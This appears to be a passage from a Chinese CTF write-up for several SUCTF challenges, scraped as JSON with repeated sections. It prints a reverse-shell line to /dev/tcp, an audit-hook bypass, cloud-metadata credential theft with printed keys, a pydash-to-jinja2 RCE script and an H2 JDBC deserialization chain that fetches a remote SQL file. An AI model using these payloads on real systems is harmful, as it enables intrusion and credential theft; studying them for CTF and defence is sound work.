EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = 